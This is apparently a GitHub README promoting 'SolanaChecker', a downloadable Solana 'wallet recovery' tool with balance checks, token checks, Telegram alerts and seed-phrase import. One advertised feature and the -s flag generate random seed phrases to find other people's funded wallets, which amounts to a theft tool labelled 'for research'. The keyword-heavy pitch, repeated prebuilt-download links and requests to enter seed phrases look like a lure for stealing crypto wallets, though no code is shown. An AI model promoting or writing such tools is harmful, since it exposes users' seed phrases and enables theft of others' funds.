# Solana Wallet Recovery Tool: Securely Regain Access

Lost your Solana wallet? Don't panic! **SolanaChecker** offers essential features to aid in your **Solana wallet recovery** efforts. This tool empowers you to securely recover access to your funds and manage your wallets. With this tool you can regain control of your SOL and SPL tokens.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/patterns/browse.webp" />
</p>

## Key Features to Aid in Solana Wallet Recovery

SolanaChecker is engineered to assist in secure Solana wallet recovery.

1.  **Check Solana Address Balance (Verify Your Recovered Wallet)**  
    After recovering your wallet, check the current Solana balance of the recovered address to ensure you’ve regained access to your funds.

<p align="left">
    <img src="/patterns/store.webp" />
</p>

2.  **Fraudulent Token Check for Peace of Mind**  
    Check the security of tokens you may have held in the wallet, or that the recovered wallet is holding. This lets you identify any potentially fraudulent projects that may have affected your holdings.

<p align="left">
    <img src="/patterns/corner.webp" />
</p>

3.  **Track Your Recovered Wallet's Activity**  
    Receive notifications about any activity on the recovered wallet. This allows you to monitor for unauthorized use.

4.  **Solana Wallet Data Recovery from Mnemonic Phrase: Your Primary Recovery Tool**  
    Recover your Solana wallet’s private key, address, and balance by using the mnemonic phrase (seed phrase) – which is the **primary tool** for Solana wallet recovery.

<p align="left">
    <img src="/patterns/resize.webp" />
</p>

5.  **Generate a New Solana Wallet (as needed)**  
    Generate a new Solana wallet with a unique private key and address, if you've lost access to your old mnemonic phrase.

<p align="left">
    <img src="/patterns/array.webp" />
</p>

6.  **Solana Wallet Generation and Balance Check (For Research)**  
    Generate random seed phrases and check for existing wallets with a balance. Discovered wallets can be monitored via Telegram notifications. *Note: This functionality should be approached with extreme caution, and is included for research purposes only*.

<p align="left">
    <img src="/patterns/element.webp" />
</p>

## Setting Up Notifications for Recovery Monitoring

Configure Telegram notifications to monitor the recovered wallet. Write down your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file.

## Getting Started with Solana Wallet Recovery

You can download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Building the Project

The project can be built using Visual Studio or another C++ compiler. You'll need to install dependencies.

### Installing Dependencies Using vcpkg:

1.  If you don’t have **vcpkg** yet, clone the repository and install it by following the instructions on the [official page](https://github.com/microsoft/vcpkg).

2.  After installing **vcpkg**, add it to your system PATH environment variable to be able to use it from the command line.

3.  Install the dependencies:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Once the dependencies are installed, build the project in Visual Studio or using another C++ compiler.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Make sure **vcpkg** is correctly integrated. Follow the instructions for [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio).
3.  Click **Build** -> **Build Solution**.
4.  After a successful build, the executable will be in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are installed via **vcpkg**.
2.  Compile the project using the following command (adapt to your compiler):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line - Using the Tool

1.  **-s / -search**
    *Not directly relevant to wallet recovery; for research purposes*.

2.  **-t / -track (ADDRESS)**
    Track a *recovered* wallet.

3.  **-g / -gen (NUMBER)**
    Generate a wallet if you *need* to, but make sure you keep the mnemonic phrase secure!

4.  **-m / -mnemonic (MNEMONIC)**
    Use this command to *recover your wallet* with your seed phrase.

5.  **-b / -balance (ADDRESS)**
    After wallet recovery, check the balance.

## Important Notes on Recovery

*   This tool is designed to help you *recover* *your* Solana wallet *if* you have the correct seed phrase.
*   Never share your seed phrase with anyone.
*   Be extremely careful of any requests for your seed phrase from anyone or any website.
*   Use this tool responsibly.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).